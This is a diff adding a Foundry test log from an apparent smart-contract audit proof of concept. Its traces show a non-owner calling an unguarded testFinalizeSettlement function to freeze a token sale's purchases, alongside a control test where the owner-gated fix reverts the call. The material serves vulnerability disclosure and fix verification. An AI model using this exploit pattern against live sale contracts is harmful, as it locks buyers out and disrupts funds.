@@ -1,0 +1,236 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 1.79s
+Compiler run successful!
+
+Ran 2 tests for test/63976-h-01-anyone-can-finalize-the-sale-early-via-testfinalizesett_exp.sol:AnyoneCanFinalizeSaleEarlyTest
+[PASS] test_control_ownerGatedFinalize_saleStaysLive() (gas: 1224644)
+Traces:
+  [1264444] AnyoneCanFinalizeSaleEarlyTest::test_control_ownerGatedFinalize_saleStaysLive()
+    ├─ [319688] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x5061796d656e740000000000000000000000000000000000000000000000000e
+    │   │   @ 1: 0 → 0x5041590000000000000000000000000000000000000000000000000000000006
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [238509] → new HarTokenSaleFixed@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   └─ ← [Return] 969 bytes of code
+    ├─ [176906] → new Buyer@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 1: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   └─ ← [Return] 661 bytes of code
+    ├─ [176906] → new Buyer@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 1: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   └─ ← [Return] 661 bytes of code
+    ├─ [44724] MiniToken::mint(Buyer: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   └─ ← [Stop]
+    ├─ [22824] MiniToken::mint(Buyer: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
+    │   ├─  storage changes:
+    │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 2: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   └─ ← [Stop]
+    ├─ [23301] Buyer::approveAll()
+    │   ├─ [22492] MiniToken::approve(HarTokenSaleFixed: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1fed4aa2224224205d7749da564c2e2d837316828f2c5471852d195a126f97e5: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return]
+    ├─ [23301] Buyer::approveAll()
+    │   ├─ [22492] MiniToken::approve(HarTokenSaleFixed: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x59f81c7c346516befe02e1ddf1b2059a56fb8d03c5cb02fd8f0128214b3517d1: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return]
+    ├─ [69496] Buyer::purchase(1000000000000000000000 [1e21])
+    │   ├─ [68727] HarTokenSaleFixed::purchase(1000000000000000000000 [1e21])
+    │   │   ├─ [23368] MiniToken::transferFrom(Buyer: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], HarTokenSaleFixed: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1fed4aa2224224205d7749da564c2e2d837316828f2c5471852d195a126f97e5: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffc9ca36523a215fffff
+    │   │   │   │   @ 0x1116d28675600672716f66a8ee87def478fe2692264054a478c0d8b1be5c8cdc: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0x7af47a8bdf279823af6da3c175ca7f26d1450816a1c9a65abbca4ba9840db69d: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [389] HarTokenSaleFixed::accepted(Buyer: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "alice buys on fixed sale") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x1111111111111111111111111111111111111111)
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  Sale: not owner)
+    │   └─ ← [Return]
+    ├─ [453] HarTokenSaleFixed::testFinalizeSettlement()
+    │   └─ ← [Revert] Sale: not owner
+    ├─ [25666] Buyer::tryPurchase(1000000000000000000000 [1e21])
+    │   ├─ [24927] HarTokenSaleFixed::purchase(1000000000000000000000 [1e21])
+    │   │   ├─ [1468] MiniToken::transferFrom(Buyer: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], HarTokenSaleFixed: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   │   @ 0x1116d28675600672716f66a8ee87def478fe2692264054a478c0d8b1be5c8cdc: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   │   │   @ 0x59f81c7c346516befe02e1ddf1b2059a56fb8d03c5cb02fd8f0128214b3517d1: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffc9ca36523a215fffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 2: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "sale stays live under the fix") [staticcall]
+    │   └─ ← [Return]
+    ├─ [389] HarTokenSaleFixed::accepted(Buyer: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "bob buys post-failed-attack") [staticcall]
+    │   └─ ← [Return]
+    ├─ [384] HarTokenSaleFixed::settlementFinalized() [staticcall]
+    │   └─ ← [Return] false
+    ├─ [0] VM::assertFalse(false, "settlement not finalized by non-owner") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_anyoneFinalizesSettlement_freezesPurchases() (gas: 3087905)
+Traces:
+  [3107805] AnyoneCanFinalizeSaleEarlyTest::test_exploit_anyoneFinalizesSettlement_freezesPurchases()
+    ├─ [1284145] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 6414 bytes of code
+    ├─ [1773039] Exploit::run()
+    │   ├─ [319688] → new MiniToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x5041590000000000000000000000000000000000000000000000000000000006
+    │   │   │   @ 0: 0 → 0x5061796d656e740000000000000000000000000000000000000000000000000e
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [224297] → new HarTokenSale@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 898 bytes of code
+    │   ├─ [176906] → new Buyer@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 661 bytes of code
+    │   ├─ [176906] → new Buyer@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   └─ ← [Return] 661 bytes of code
+    │   ├─ [319688] → new MiniToken@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x46524f5a454e2d53414c45000000000000000000000000000000000000000016
+    │   │   │   @ 0: 0 → 0x46726f7a656e53616c6500000000000000000000000000000000000000000014
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [44724] MiniToken::mint(Buyer: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0x39ca2902e4da2862e9016cc5f214372696deb2dcca85905398c43378e0fbbe48: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [22824] MiniToken::mint(Buyer: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xba24e7e6b4df34f8c31e4519b991325a0ca6aa99983a680ca2a69b3c77f789d0: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 2: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   └─ ← [Stop]
+    │   ├─ [23301] Buyer::approveAll()
+    │   │   ├─ [22492] MiniToken::approve(HarTokenSale: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x128074619b5f6ca0fa6cdc09c06323a47df6d18064345fb162c12e05dc480ddc: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return]
+    │   ├─ [23301] Buyer::approveAll()
+    │   │   ├─ [22492] MiniToken::approve(HarTokenSale: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe06a8d325a9999bcc0005eb770f4b5bb35f3a4b29380cdf4289c1f5ac5c1b038: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return]
+    │   ├─ [69496] Buyer::purchase(1000000000000000000000 [1e21])
+    │   │   ├─ [68727] HarTokenSale::purchase(1000000000000000000000 [1e21])
+    │   │   │   ├─ [23368] MiniToken::transferFrom(Buyer: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], HarTokenSale: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1000000000000000000000 [1e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x39ca2902e4da2862e9016cc5f214372696deb2dcca85905398c43378e0fbbe48: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   │   │   @ 0x887583d56e5ebc1b6081f212e3300a82ad5d24c60ab663d07f0ba44aa75ea4ac: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   │   @ 0x128074619b5f6ca0fa6cdc09c06323a47df6d18064345fb162c12e05dc480ddc: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffc9ca36523a215fffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x39ca2902e4da2862e9016cc5f214372696deb2dcca85905398c43378e0fbbe48: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [389] HarTokenSale::accepted(Buyer: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─ [478] HarTokenSale::testFinalizeSettlement()
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f → 0x0000000000000000000000015615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Stop]
+    │   ├─ [384] HarTokenSale::settlementFinalized() [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ [1083] Buyer::tryPurchase(1000000000000000000000 [1e21])
+    │   │   ├─ [481] HarTokenSale::purchase(1000000000000000000000 [1e21])
+    │   │   │   └─ ← [Revert] Sale: settlement finalized
+    │   │   └─ ← [Return] false
+    │   ├─ [1083] Buyer::tryPurchase(1000000000000000000000 [1e21])
+    │   │   ├─ [481] HarTokenSale::purchase(1000000000000000000000 [1e21])
+    │   │   │   └─ ← [Revert] Sale: settlement finalized
+    │   │   └─ ← [Return] false
+    │   ├─ [44724] MiniToken::mint(0x000000000000000000000000000000000000D00d, 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   @ 0x494c6a187b5f0ab149a904d98255e546761031f5c4a839c3a72b33eb009c7912: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─  storage changes:
+    │   │   @ 6: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 2: 0 → 65793
+    │   │   @ 5: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 3: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 1: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   @ 0: 0 → 1
+    │   └─ ← [Return]
+    ├─ [264] Exploit::alicePurchasedOk() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "buyer purchase should succeed pre-attack") [staticcall]
+    │   └─ ← [Return]
+    ├─ [371] Exploit::aliceAllocation() [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "allocation recorded pre-attack") [staticcall]
+    │   └─ ← [Return]
+    ├─ [452] Exploit::settlementFinalizedFlag() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "settlement finalized by non-owner") [staticcall]
+    │   └─ ← [Return]
+    ├─ [301] Exploit::bobPurchaseBlocked() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "fresh buyer permanently frozen out") [staticcall]
+    │   └─ ← [Return]
+    ├─ [411] Exploit::alicePurchaseBlocked() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "existing buyer permanently frozen out") [staticcall]
+    │   └─ ← [Return]
+    ├─ [305] Exploit::blockedAmount() [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "blocked payment magnitude") [staticcall]
+    │   └─ ← [Return]
+    ├─ [373] Exploit::markerAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]
+    ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "marker records frozen amount at SINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [327] Exploit::sinkMarkerBalance() [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "sink marker balance") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.32ms (1.85ms CPU time)
+
+Ran 1 test suite in 128.84ms (1.32ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+_shared/run-poc/run_poc.sh: line 71: 59471 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/63976-h-01-anyone-can-finalize-the-sale-early-via-testfinalizesett_exp)
